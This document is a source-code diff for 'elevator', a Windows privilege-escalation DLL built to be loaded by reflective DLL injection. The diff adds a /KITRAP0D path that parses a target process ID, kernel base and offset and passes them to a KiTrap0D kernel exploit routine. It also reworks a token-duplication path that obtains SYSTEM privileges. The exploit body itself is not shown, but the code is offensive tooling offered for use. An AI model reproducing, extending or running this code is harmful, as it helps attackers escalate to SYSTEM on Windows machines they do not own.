@@ -1,14 +1,14 @@
 //
-// Note: To use the produced x86 dll on NT4 you must manually edit the PE Header (CFF Explorer[1] is good) in order
-//       to change the MajorOperatingSystemVersion and MajorSubsystemVersion to 4 instead of 5 as Visual C++ 2008
+// Note: To use the produced x86 dll on NT4 we use a post build event "editbin.exe /OSVERSION:4.0 /SUBSYSTEM:WINDOWS,4.0 elevator.dll" 
+//       in order to change the MajorOperatingSystemVersion and MajorSubsystemVersion to 4 instead of 5 as Visual C++ 2008
 //       can't build PE images for NT4 (only 2000 and up). The modified dll will then work on NT4 and up. This does
 //       not apply to the produced x64 dll.
 //
-// [1] http://www.ntcore.com/exsuite.php
-//
+
 #include "elevator.h"
 #include "namedpipeservice.h"
 #include "tokendup.h"
+#include "kitrap0d.h"
 
 // define this as we are going to be injected via LoadRemoteLibraryR
 #define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
@@ -18,6 +18,60 @@
 
 // include the Reflectiveloader() function
 #include "../ReflectiveDLLInjection/ReflectiveLoader.c"
+
+/*
+ * Grab a DWORD value out of the command line.
+ * e.g. elevator_command_dword( "/FOO:0x41414141 /BAR:0xCAFEF00D", "/FOO:" ) == 0x41414141
+ */
+DWORD elevator_command_dword( char * cpCommandLine, char * cpCommand )
+{
+	char * cpString = NULL;
+	DWORD dwResult  = 0;
+
+	do
+	{
+		if( !cpCommandLine || !cpCommand )
+			break;
+		
+		cpString = strstr( cpCommandLine, cpCommand );
+		if( !cpString )
+			break;
+
+		cpString += strlen( cpCommand );
+
+		dwResult = strtoul( cpString, NULL, 0 );
+
+	} while( 0 );
+
+	return dwResult;
+}
+
+/*
+ * Grab a int value out of the command line.
+ * e.g. elevator_command_dword( "/FOO:12345 /BAR:54321", "/FOO:" ) == 12345
+ */
+int elevator_command_int( char * cpCommandLine, char * cpCommand )
+{
+	char * cpString = NULL;
+	int iResult     = 0;
+
+	do
+	{
+		if( !cpCommandLine || !cpCommand )
+			break;
+		
+		cpString = strstr( cpCommandLine, cpCommand );
+		if( !cpString )
+			break;
+
+		cpString += strlen( cpCommand );
+
+		iResult = atoi( cpString );
+
+	} while( 0 );
+
+	return iResult;
+}
 
 /*
  * The real entrypoint for this app.
@@ -38,13 +92,28 @@ VOID elevator_main( char * cpCommandLine )
 			
 		dprintf( "[ELEVATOR] elevator_main. lpCmdLine=%s", cpCommandLine );
 		
-		if( strstr( cpCommandLine, "/t:" ) )
+		if( strstr( cpCommandLine, "/KITRAP0D" ) )
+		{
+			DWORD dwProcessId  = 0;
+			DWORD dwKernelBase = 0;
+			DWORD dwOffset     = 0;
+
+			dwProcessId  = elevator_command_dword( cpCommandLine, "/VDM_TARGET_PID:" );
+			dwKernelBase = elevator_command_dword( cpCommandLine, "/VDM_TARGET_KRN:" );
+			dwOffset     = elevator_command_dword( cpCommandLine, "/VDM_TARGET_OFF:" );
+
+			if( !dwProcessId || !dwKernelBase )
+				break;
+
+			elevator_kitrap0d( dwProcessId, dwKernelBase, dwOffset );
+
+			// ...we should never return here...
+		}
+		else if( strstr( cpCommandLine, "/t:" ) )
 		{
 			DWORD dwThreadId = 0;
 
-			cpCommandLine += strlen( "/t:" );
-
-			dwThreadId = atoi( cpCommandLine );
+			dwThreadId = elevator_command_dword( cpCommandLine, "/t:" );
 
 			dwResult = elevator_tokendup( dwThreadId, SECURITY_LOCAL_SYSTEM_RID );
 
